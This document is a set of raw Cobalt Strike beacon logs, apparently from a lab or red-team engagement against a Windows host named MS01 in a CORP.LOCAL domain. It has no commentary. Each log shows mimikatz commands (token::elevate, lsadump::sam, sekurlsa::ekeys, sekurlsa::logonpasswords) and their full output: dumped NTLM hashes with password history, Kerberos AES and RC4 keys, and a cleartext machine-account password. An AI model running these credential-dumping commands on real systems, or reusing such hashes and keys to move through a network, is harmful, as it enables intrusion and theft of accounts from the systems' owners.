
```powershell
[10/19 14:29:54] beacon> mimikatz token::elevate ; lsadump::sam
[10/19 14:30:06] [*] Tasked beacon to run mimikatz's token::elevate ; lsadump::sam command
[10/19 14:30:07] [+] host called home, sent: 813680 bytes
[10/19 14:30:09] [+] received output:
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

592	{0;000003e7} 1 D 30883     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 415273503 	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,28p)	Primary
 * Thread Token  : {0;000003e7} 1 D 415402758 	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
Domain : MS01
SysKey : a72365a2384f0ff6ad435c166a5bbebc
Local SID : S-1-5-21-4116505479-897374152-2296881962

SAMKey : 8e8ec73c9103331c928f72c2e48d31be

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003e9 (1001)
User : justalocaladmin
  Hash NTLM: 36ac6439712a12159ef1cfa88983f622
    lm  - 0: e4227c0aaee1a293e9f67936663ee9cb
    lm  - 1: b5157ae48e4a61501ae90ffe3c17ea35
    lm  - 2: 84a72e1d64c6d61c2fa084b3dbf417f5
    lm  - 3: 69b345e34a28ee4dd86bab945ac5168c
    lm  - 4: 738f1fbf4919bf45c4e5992f773243af
    lm  - 5: 1d53a0c755381bc549d44ed557e3d726
    lm  - 6: 59fff4b0d62f8349962af72143986a53
    lm  - 7: 7f59b5128aa7fcaa3c89b9ca84e14b01
    lm  - 8: cc48e77ff1d6dfe54658728e398e132f
    lm  - 9: 7f67e844559011bbb4a6810723a5e1c1
    lm  -10: 59032e8d6d6778e9834032e0b4894126
    lm  -11: 9c739729dbdda0cf04c1383f39d12e3f
    lm  -12: b22d06cf4f86771048ae10e52f0f5308
    lm  -13: e41f959618d9cdd98653b5096f78b7a8
    lm  -14: 84f05c5e6cca60836ded328da0365e25
    lm  -15: 789c207f9392cf2750e289d6409bda45
    lm  -16: bfbdffe58f96f8157a5be45ee9bcfd68
    lm  -17: c37876ac6267d5dca61222e1fc696ec2
    lm  -18: a21f3c95ac7047e2785c7e8e3c37fcd1
    lm  -19: e0f8b88e08358e17ebd988e6adc83749
    lm  -20: c87d61349e3255c8190abcdba33022d1
    lm  -21: 09578fbf3ecb68c5455e816f680e65a2
    lm  -22: fb272dce0a552bce645822aa83b4ceb2
    lm  -23: 27292f61497ae807fc5a4cf7dd7ee055
    ntlm- 0: 36ac6439712a12159ef1cfa88983f622
    ntlm- 1: 6a9221f732a7aeb860d15aa7e804404b
    ntlm- 2: ecc60ef0992ac4470ebbbc9440cd3c1d
    ntlm- 3: 425126e519af57fdf5680fa74d0e92e1
    ntlm- 4: d17effa8ac897fdf07d89a7abd1924d3
    ntlm- 5: 84ea3d0cc6b4410600f117f1c834d90e
    ntlm- 6: 3ab93c2dd404d4a8cf34d50085e7422b
    ntlm- 7: 6ba99429d7e4b30450334518f1134097
    ntlm- 8: 3b2f226a7eeea7fc567e95ba0ee1449e
    ntlm- 9: aa0bf1613980d1b12c1b9d597085fa66
    ntlm-10: 74039f47ccccd2a6f6dbcf6da26b84b6
    ntlm-11: 667e056ed77abcb4d1ff69f9d4b152f8
    ntlm-12: 9ec2c1f739466d0d9e1bd7d792bda6fb
    ntlm-13: 65c125df955595ab339ce3daf7b6134a
    ntlm-14: 3eb47a38d9915ed44d92e813f73c1a3c
    ntlm-15: b6eaa6ad675da196ea6edcc80245ef70
    ntlm-16: a0d3dd384aa4dd28b20a688b237f9008
    ntlm-17: c9b0ae650afa35fe4e23b952285d1c3f
    ntlm-18: 1f9b75aa1b748c39b31c4b745c95c071
    ntlm-19: 9c01a2b05ed82b4532c76efc141c9b7d
    ntlm-20: 7a68577fa40ab31a1dd9cc3ffdb7e714
    ntlm-21: 0b61202610be5950653013de65bf2a97
    ntlm-22: bf965175fad8c9a7745c30c535b1a0e5
    ntlm-23: 7d58711c1ffdd7c254be28f0fbde8f8b
```

```powershell
[10/19 15:04:38] beacon> mimikatz !sekurlsa::ekeys
[10/19 15:04:39] [*] Tasked beacon to run mimikatz's !sekurlsa::ekeys command
[10/19 15:04:40] [+] host called home, sent: 813682 bytes
[10/19 15:04:42] [+] received output:

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-18

	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       ca5535b6c115d08ac507ad9b56229f6874a515f922ca7ae7ae9c26ee61ccc0f7
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 37959328 (00000000:024336a0)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/6/2023 12:20:30 PM
SID               : S-1-5-18

	 * Username : Administrator
	 * Domain   : CORP
	 * Password : (null)
	 * Key List :
	   null              <no size, buffer is incorrect>
	   null              <no size, buffer is incorrect>
	   rc4_hmac_nt       7facdc498ed1680c4fd1448319a8c04f
	   rc4_hmac_old      7facdc498ed1680c4fd1448319a8c04f
	   rc4_md4           7facdc498ed1680c4fd1448319a8c04f
	   rc4_hmac_nt_exp   7facdc498ed1680c4fd1448319a8c04f
	   rc4_hmac_old_exp  7facdc498ed1680c4fd1448319a8c04f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-20

	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       ca5535b6c115d08ac507ad9b56229f6874a515f922ca7ae7ae9c26ee61ccc0f7
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 66631 (00000000:00010447)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1

	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	 * Key List :
	   aes256_hmac       2144003ad888aea454328baedf99d3aff8b4b340c74159390ec7599c568ad2b8
	   aes128_hmac       187ef7ac1823f7bcd76940ea16521782
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 66237 (00000000:000102bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1

	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	 * Key List :
	   aes256_hmac       2144003ad888aea454328baedf99d3aff8b4b340c74159390ec7599c568ad2b8
	   aes128_hmac       187ef7ac1823f7bcd76940ea16521782
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4
```

```powershell
[10/19 15:05:42] beacon> mimikatz !sekurlsa::logonpasswords
[10/19 15:05:43] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[10/19 15:05:44] [+] host called home, sent: 813691 bytes
[10/19 15:05:46] [+] received output:

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 37959328 (00000000:024336a0)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/6/2023 12:20:30 PM
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : CORP
	 * NTLM     : 7facdc498ed1680c4fd1448319a8c04f
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66631 (00000000:00010447)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 66237 (00000000:000102bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 35813 (00000000:00008be5)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	


```